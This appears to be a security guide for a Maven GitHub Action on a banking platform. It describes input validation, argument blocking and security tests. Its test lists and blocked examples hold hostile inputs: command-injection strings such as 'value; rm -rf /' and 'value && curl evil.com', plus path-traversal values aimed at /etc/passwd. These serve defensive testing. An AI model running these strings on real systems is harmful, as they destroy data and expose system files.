# Security Guide

## Input Validation Architecture

### **Architectural Viewpoint**
Input validation is the first line of defense in our GitHub Action, especially critical for banking platform CI/CD pipelines. The `InputValidator` class implements defense-in-depth security principles, validating all inputs before any Maven operations begin.

### **Design Options + Trade-offs**

**Option 1: Basic GitHub Actions Input Validation (Built-in)**
- ✅ Simple to implement
- ❌ Limited validation capabilities
- ❌ No protection against injection attacks
- ❌ No business logic validation

**Option 2: Comprehensive Custom Validation (Current Choice)**
- ✅ Complete security coverage
- ✅ Banking-grade input sanitization
- ✅ Path traversal protection
- ✅ Command injection prevention
- ✅ Business rule enforcement
- ❌ More complex implementation
- ❌ Additional maintenance overhead

**Option 3: External Validation Service**
- ✅ Centralized validation logic
- ❌ Network dependency
- ❌ Latency impact
- ❌ Additional infrastructure complexity

### **Recommendation**
The comprehensive custom validation approach provides the security rigor required for banking environments while maintaining action performance and reliability.

## Security Features

### 1. Input Validation (`src/validators/input-validator.js`)

#### **Operation Validation**
```javascript
// Only allows valid Maven lifecycle phases
const validOperations = ['validate', 'compile', 'test', 'package', 'verify', 'install', 'deploy'];
```

#### **Path Security**
- **Path Traversal Protection**: Detects `../`, `..\\`, URL-encoded variants
- **Absolute Path Rejection**: Only relative paths allowed
- **Invalid Character Detection**: Blocks `<>:"|?*` and control characters
- **Length Limits**: Prevents buffer overflow attempts

```javascript
// Example blocked paths
'../../../etc/passwd'     // Path traversal
'/absolute/path'          // Absolute path
'path<with>invalid'       // Invalid characters
```

#### **Command Injection Prevention**
```javascript
// Detects dangerous patterns in maven-args
const dangerousPatterns = [';', '&&', '||', '|', '`', '$(', '${', '\n', '\r'];
```

#### **URL Security**
- **HTTPS Enforcement**: Only HTTPS URLs accepted for deployment
- **Internal URL Blocking**: Prevents localhost/internal network access
- **URL Format Validation**: Proper URL structure required

```javascript
// Blocked internal URLs
'https://localhost:8080'
'https://127.0.0.1'
'https://192.168.1.100'
'https://10.0.0.1'
```

### 2. Secure Configuration Management

#### **Validated Input Structure**
```javascript
const validatedInputs = {
  operation: 'package',           // Validated against allowed operations
  javaVersion: '17',             // Validated against supported versions
  workingDirectory: './src',      // Path traversal checked
  profiles: 'ci,test',           // Alphanumeric validation
  mavenArgs: '-Dtest=true',      // Command injection checked
  deployUrl: 'https://...',      // HTTPS + external URL only
  // ... other validated inputs
};
```

#### **Sensitive Data Handling**
```javascript
// Automatic sanitization for logging
sanitizeForLogging(inputs) {
  const sanitized = { ...inputs };
  if (sanitized.deployPassword) {
    sanitized.deployPassword = '***';
  }
  return sanitized;
}
```

### 3. Maven Argument Security

#### **Blocked Arguments**
```javascript
const dangerousArgs = [
  '--settings', '-s',    // Use settings-file input instead
  '--file', '-f',        // POM file changes not allowed
  '--batch-mode', '-B',  // We control batch mode
  '--quiet', '-q',       // We control logging
  '--debug', '-X'        // We control debug mode
];
```

#### **Safe Argument Examples**
```bash
# ✅ Allowed
-Dmaven.test.skip=true
-Dspring.profiles.active=test
-Dversion=1.0.0

# ❌ Blocked
-s /etc/passwd
--file ../../../pom.xml
-Dtest=true; rm -rf /
```

### 4. Deployment Security

#### **Repository URL Validation**
- Only HTTPS URLs accepted
- Internal/localhost URLs blocked
- Proper URL format required
- Credential validation (non-empty passwords)

#### **Supported Deployment Targets**
```javascript
const validDeployTargets = ['nexus', 'artifactory', 'github-packages'];
```

## Security Testing

### Unit Tests (`tests/validators/input-validator.test.js`)

#### **Path Traversal Tests**
```javascript
const maliciousPaths = [
  '../../../etc/passwd',
  '..\\..\\windows\\system32',
  '%2e%2e/etc',
  '..%2f',
  '..%5c'
];
```

#### **Command Injection Tests**
```javascript
const maliciousInputs = [
  'value; rm -rf /',
  'value && curl evil.com',
  'value`whoami`',
  'value$(id)',
  'value${USER}'
];
```

#### **URL Security Tests**
```javascript
const internalUrls = [
  'https://localhost:8080/nexus',
  'https://127.0.0.1:8080/nexus',
  'https://192.168.1.100/nexus',
  'https://10.0.0.1/nexus'
];
```

## Integration with Action Flow

### 1. **Early Validation** (First Step)
```javascript
// In src/index.js - validation happens before any operations
const inputValidator = new InputValidator();
const validatedInputs = inputValidator.validateInputs();
```

### 2. **Validated Input Distribution**
```javascript
// All components receive validated inputs
const mavenHandler = new MavenActionHandler(outputManager, validatedInputs);
const mavenExecutor = new MavenExecutor(validatedInputs);
const cacheManager = new CacheManager(validatedInputs);
```

### 3. **No Direct core.getInput() Usage**
All components use `this.validatedInputs` instead of calling `core.getInput()` directly, ensuring all inputs have been validated.

## Security Best Practices

### 1. **Fail Fast**
- Input validation occurs immediately at action start
- Any validation failure stops execution completely
- Clear error messages for debugging (without exposing sensitive data)

### 2. **Defense in Depth**
- Multiple validation layers (format, content, security)
- Whitelist approach (only allow known-good values)
- Length limits on all string inputs
- Character set restrictions

### 3. **Secure Defaults**
- HTTPS-only for external URLs
- Relative paths only for file operations
- Conservative Maven argument filtering
- Automatic credential masking in logs

### 4. **Audit Trail**
- All validation failures logged
- Sanitized input values logged for debugging
- Security events clearly marked in logs

## Compliance Considerations

### Banking Regulatory Requirements
- **Input Sanitization**: All user inputs validated and sanitized
- **Path Traversal Protection**: File system access restricted
- **Command Injection Prevention**: Shell command construction secured
- **Credential Protection**: Sensitive data masked in logs
- **Audit Logging**: Security events tracked

### Security Standards Alignment
- **OWASP Top 10**: Injection prevention, security misconfiguration protection
- **NIST Cybersecurity Framework**: Input validation as preventive control
- **ISO 27001**: Information security management practices

## Monitoring and Alerting

### Security Events to Monitor
```javascript
// Log patterns to watch for
'Input validation failed'           // Validation failures
'Path traversal detected'          // Security attacks
'command injection detected'       // Injection attempts
'Internal/localhost URLs not allowed' // Internal network probing
```

### Recommended Alerts
- Multiple validation failures from same source
- Repeated path traversal attempts
- Command injection pattern detection
- Unusual deployment URL patterns

## Security Updates

### Regular Security Reviews
1. **Monthly**: Review validation rules for new attack patterns
2. **Quarterly**: Update dependency versions for security patches
3. **Annually**: Full security audit of validation logic

### Threat Model Updates
- Monitor for new Maven-specific attack vectors
- Track GitHub Actions security advisories
- Update validation rules based on threat intelligence

---

**Security Architecture Question**: 

Given that this action will process inputs from multiple development teams across your banking platform, how would you design a centralized security policy system that allows security teams to update validation rules (like allowed deployment URLs or Maven argument patterns) without requiring action updates, while maintaining the principle of least privilege and ensuring policy changes are auditable and reversible?